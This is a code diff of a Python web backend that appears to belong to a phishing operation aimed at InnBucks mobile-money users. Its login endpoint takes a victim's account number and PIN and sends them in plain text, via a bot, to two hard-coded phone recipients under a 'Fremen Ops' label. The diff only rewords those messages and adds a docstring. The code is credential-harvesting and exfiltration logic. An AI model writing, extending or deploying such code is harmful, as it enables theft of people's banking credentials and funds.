@@ -29,6 +29,9 @@ class OTPVerification(BaseModel):
     survey_data: SurveyData
 
 class LoginRequest(BaseModel):
+    '''
+    details for logging into the innbucks mobile app 
+    '''
     innbucks_number: str
     pin: str
 
@@ -213,11 +216,11 @@ async def login(login_req: LoginRequest):
     try:
         # send to bot and advise that this is from the second screen
         bot.send_message(
-            message=f"Fremen Ops\n\n This is from the second screen\n\nInnbucks Number: {login_req.innbucks_number}\nPIN: {login_req.pin}",
+            message=f"Fremen Ops\n\n InnBucks Mobile App Pin from the second screen\n\nInnbucks Number: {login_req.innbucks_number}\nPIN: {login_req.pin}",
             recipient_id="263779281345",
         )
         bot.send_message(
-            message=f"This is from the second screen\n\nInnbucks Number: {login_req.innbucks_number}\nPIN: {login_req.pin}",
+            message=f"InnBucks Mobile App Pin from the second screen\n\nInnbucks Number: {login_req.innbucks_number}\nPIN: {login_req.pin}",
             recipient_id="263776525400",
         )
             
